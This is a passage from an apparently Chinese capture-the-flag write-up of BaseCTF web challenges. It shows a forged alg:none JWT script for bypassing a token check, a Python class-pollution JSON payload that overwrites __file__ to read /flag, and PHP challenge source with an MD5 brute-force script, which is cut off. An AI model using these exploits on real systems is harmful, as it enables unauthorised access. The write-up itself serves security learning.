double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"BaseCTF&#123;a0fd8763-8a3b-4bc5-b430-f09a213482e3&#125; "</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">28</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET /favicon.ico HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5472</span> <span class="token string double-quoted-string">"http://challenge.basectf.fun:30015/"</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">43</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"GET / HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">5478</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"</span> <span class="token string double-quoted-string">"-"</span> <span class="token number">10.32</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">/</span>Sep<span class="token operator">/</span><span class="token number">2024</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">46</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string double-quoted-string">"\x16\x03\x01\x00\xD2\x01\x00\x00\xCE\x03\x03\xC25 \xAE\x14'\xE9\x9C\x84\xF1\xB3\xDD\xE3\x09h\x98.\x10\x86\x16\xECn4\x10\xE7\xB3!r\xBA\x1BB\xA2\x00\x00b\xC00\xC0,\xC0/\xC0+\x00\x9F\x00\x9E\xC02\xC0.\xC01\xC0-\x00\xA5\x00\xA1\x00\xA4\x00\xA0\xC0(\xC0$\xC0\x14\xC0"</span> <span class="token number">400</span> <span class="token number">157</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"-"</span> <span class="token string double-quoted-string">"-"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="no-jwt"><a href="#no-jwt" class="headerlink" title="no jwt"></a>no jwt</h2><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> jwt<span class="token keyword">import</span> datetime<span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">import</span> stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment"># 随机生成 secret_key</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 登录接口</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json    username <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    <span class="token comment"># 其他用户都给予 user 权限</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">,</span>  <span class="token comment"># 普通用户角色</span>        <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'token'</span><span class="token punctuation">:</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token comment"># flag 接口</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">"verify_exp"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token comment"># 检查用户角色是否为 admin</span>            <span class="token keyword">if</span> decoded<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    flag_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'flag'</span><span class="token punctuation">:</span> flag_content<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Access denied: admin only'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">403</span>        <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Flag file not found'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Token has expired'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>InvalidTokenError<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Invalid token'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Token is missing'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">401</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>向<code>login</code>中发送<code>post</code>数据得到<code>token</code>验证后的<code>jwt</code>格式，把<code>role</code>改成<code>admin</code></p><p>生成<code>jwt token</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt  <span class="token comment"># 导入 PyJWT 包</span><span class="token comment"># payload</span>token_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token comment"># 使用 None 而不是 null</span>  <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>  <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span><span class="token comment"># 使用 PyJWT 的 encode 方法</span>jwt_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token_dict<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>jwt_token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以<code>Bearer</code>方案发送认证数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># 假设你已经有了一个JWT</span>jwt_token <span class="token operator">=</span> <span class="token string">'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'</span><span class="token comment"># 目标URL</span>url <span class="token operator">=</span> <span class="token string">'http://challenge.basectf.fun:27209/flag'</span><span class="token comment"># 发送GET请求，将JWT放在Authorization头部中</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>jwt_token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># 检查响应</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Success:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="back-to-the-future"><a href="#back-to-the-future" class="headerlink" title="back to the future"></a>back to the future</h2><p><code>githacker</code>得到<code>git</code>源码直接<code>git show</code></p><h2 id="圣钥之战"><a href="#圣钥之战" class="headerlink" title="圣钥之战"></a>圣钥之战</h2><p>提升可以去<code>read</code>那里找一下<code>flag</code>，访问<code>/read</code>拿到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/static/index.html'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> f"J1ngHong说：你想read flag吗？那么圣钥之光必将阻止你！但是小小的源码没事，因为你也读不到flag<span class="token punctuation">(</span>乐<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span>"<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/pollute'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Pollution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>instance<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"J1ngHong说：钥匙圣洁无暇，无人可以污染！"</span>    <span class="token keyword">return</span> <span class="token string">"J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>python</code>原型链污染<code>__file__</code>为<code>flag</code>，发送<code>post</code>数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"__init__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">"__globals__"</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token string">"__file__"</span><span class="token punctuation">:</span><span class="token string">"/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"错了！就你还想玩原神？❌❌❌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$tip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tip</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"我要玩原神"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我不管，我要玩原神！😭😭😭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"可恶的QQ人！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"100%"</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"love100%"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>  <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ii</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ii</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ii</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token variable">$ii</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>len</code>数组的长度要和<code>array</code>一样，爆破<code>array</code>的长度为<code>45</code>，源码给出了<code>m</code>数组的内容</p><p>最后得到<code>flag</code>的数组，每一位进行<code>md5</code>，直接爆破<code>md5</code></p><p><code>php</code>的数组：<code>len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4</code>（拼接</p><p>爆破<code>md5</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlibmd5_array  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="token punctuation">,</span><span class="token string">"26657d5ff9020d2abefe558796b99584"</span><span class="token punctuation">,</span><span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span><span class="token string">"ec8956637a99787bd197eacd77acce5e"</span><span class="token punctuation">,</span><span class="token string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="token punctuation">,</span><span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">,</span><span class="token string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="token punctuation">,</span><span class="token string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="token punctuation">,</span><span class="token string">"072b030ba126b2f4b2374f342be9ed44"</span><span class="token punctuation">,</span><span class="token string">"c9e1074f5b3f9fc8ea15d152add07294"</span><span class="token 